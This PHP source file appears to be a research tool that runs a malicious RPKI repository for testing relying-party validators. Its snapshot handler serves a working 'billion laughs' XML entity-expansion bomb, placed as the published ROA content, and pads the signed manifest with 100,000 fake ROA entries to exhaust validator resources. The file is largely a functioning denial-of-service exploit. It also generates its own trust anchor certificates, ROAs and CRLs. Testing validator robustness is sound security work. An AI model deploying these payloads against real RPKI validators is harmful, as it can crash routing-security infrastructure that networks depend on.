<?php

namespace koenvh\RPKI;


use Laminas\Diactoros\Response;
use Ramsey\Uuid\Uuid;
use XMLWriter;

class GController
{
    private string $domain = "g.rprp.nlnetlabs.net";
    private string $sessionId = "23e3c698-2ead-4386-b3be-b04b73f364c1";
    private string $serial = "1337";
    private int $number = 1;

    function __construct() {
        $this->domain = $_SERVER['SERVER_NAME'];
        preg_match('/g(\d*)-([^.]+)\./', $this->domain, $matches);
        if ($matches[1]) {
            $this->number = (int)$matches[1];
        }
        $this->sessionId = $matches[2];
    }

    function tal() {
        $openSSL = new OpenSSL();

        if (!($content = $openSSL->retrieveTal($this->domain))) {
            $privateKey = null;
            $certificate = null;
            $openSSL->generateCertificate($this->domain, $certificate, $privateKey);
            $publicKey = $openSSL->getPublicKey($privateKey);
            $publicKey = $openSSL->stripPublicKey($publicKey);

            $content = "https://$this->domain/ta/ta.cer\nrsync://$this->domain/ta/ta.cer\n\n$publicKey";
            $openSSL->storePrivateKey($this->domain, $privateKey);
            $openSSL->storeCertificate($this->domain, $certificate);
            $openSSL->storeTal($this->domain, $content);
        }

        return new Response\TextResponse($content, 200, [
            "Content-Type" => "text/plain"
        ]);
    }

    function cer() {
        $openSSL = new OpenSSL();
        return new Response\TextResponse($openSSL->retrieveCertificate($this->domain), 200, [
            "Content-Type" => "application/octet-stream"
        ]);
    }

    function notification() {
        $uniqid = $this->number + 1;

        $xml = new XMLWriter();
        $xml->openMemory();
        $xml->setIndent(true);
        $xml->startElement("notification");
        $xml->writeAttribute("version", "1");
        $xml->writeAttribute("session_id", $this->sessionId);
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("xmlns", "http://www.ripe.net/rpki/rrdp");
        $xml->startElement("snapshot");
        $xml->writeAttribute("uri", "https://$this->domain/$uniqid/snapshot.xml");
        $xml->writeAttribute("hash", hash("sha256", $this->snapshot($uniqid)->getBody()->getContents()));
        $xml->endElement();

        $xml->startElement("delta");
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("uri", "https://$this->domain/1337/delta.xml");
        $xml->writeAttribute("hash", hash("sha256", $this->delta("1337")->getBody()->getContents()));
        $xml->endElement();

        $xml->endElement();

        return new Response\TextResponse($xml->outputMemory(), 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }

    function snapshot($uniqid) {
        ini_set("memory_limit", "2048M");

        $openSSL = new OpenSSL();

        $newDomain = "g$uniqid-$this->sessionId." . DOMAIN;

        if (!$openSSL->retrieveCertificate($newDomain)) {
            $openSSL->generateCertificate($newDomain, $certificate, $privateKey, false, $this->domain);
            $openSSL->storePrivateKey($newDomain, $privateKey);
            $openSSL->storeCertificate($newDomain, $certificate);
        }

        if (!($roa = $openSSL->retrieveRoa($this->domain, 1))) {
            $roa = $openSSL->generateRoa(1234, [
                "1.2.3.4/32"
            ], [
                "2001:0db8:85a3:0000:1319:8a2e:0370:7344/128"
            ], $openSSL->retrievePrivateKey($this->domain), $this->domain);
            $openSSL->storeRoa($this->domain, $roa, 1);
        }

        if (!($manifest = $openSSL->retrieveManifest($this->domain))) {
            $crl = $openSSL->generateCrl(
                $openSSL->retrieveCertificate($this->domain),
                $openSSL->retrievePrivateKey($this->domain),
                $this->domain
            );
            $openSSL->storeCrl($this->domain, $crl);

            $fileList = [
//                [
//                    "file" => "koenvh-aia.cer",
//                    "hash" => hash("sha256", $openSSL->retrieveCertificate($this->domain))
//                ],
//                [
//                    "file" => "koenvh.cer",
//                    "hash" => hash("sha256", $openSSL->retrieveCertificate($this->domain))
//                ],
                [
                    "file" => "koenvh.crl",
                    "hash" => hash("sha256", base64_decode($openSSL->retrieveCrl($this->domain)))
                ],
                [
                    "file" => "koenvh.roa",
                    "hash" => hash("sha256", base64_decode($openSSL->retrieveRoa($this->domain, 1)))
                ]
            ];
            for ($i = 0; $i < 100000; $i++) {
                $fileList[] = [
                    "file" => "foo$i.roa",
                    "hash" => "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"
                ];
            }
            $manifest = $openSSL->generateManifest($fileList, $openSSL->retrievePrivateKey($this->domain), $this->domain);
            $openSSL->storeManifest($this->domain, $manifest);
        }

        $xml = new XMLWriter();
        $xml->openMemory();
        $xml->setIndent(true);
        $xml->writeRaw('<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>');
        $xml->startElement("snapshot");
        $xml->writeAttribute("version", "1");
        $xml->writeAttribute("session_id", $this->sessionId);
        $xml->writeAttribute("serial", $this->serial);
        $xml->writeAttribute("xmlns", "http://www.ripe.net/rpki/rrdp");

//        $xml->startElement("publish");
//        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.roa");
//        $xml->writeRaw(base64_encode($openSSL->retrieveCertificate($newDomain)));
//        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh-aia.cer");
        $xml->writeRaw(base64_encode($openSSL->retrieveCertificate($this->domain)));
        $xml->endElement();

//        $xml->startElement("publish");
//        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.cer");
//        $xml->writeRaw(base64_encode($openSSL->retrieveCertificate($this->domain)));
//        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.crl");
        $xml->writeRaw($openSSL->retrieveCrl($this->domain));
        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.mft");
        $xml->writeRaw($manifest);
        $xml->endElement();

        $xml->startElement("publish");
        $xml->writeAttribute("uri", "rsync://$this->domain/repository/koenvh.roa");
        $xml->writeRaw("&lol9;");
        $xml->endElement();

        $xml->endElement();

        return new Response\TextResponse($xml->outputMemory(), 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }

    function delta($i) {
        return new Response\TextResponse("", 200, [
            "Content-Type" => "text/xml",
            "Last-Modified" => gmdate("D, d M Y H:i:s") . " GMT",
            "Expires" => gmdate("D, d M Y H:i:s") . " GMT",
            "Cache-Control" => "max-age=60"
        ]);
    }
}
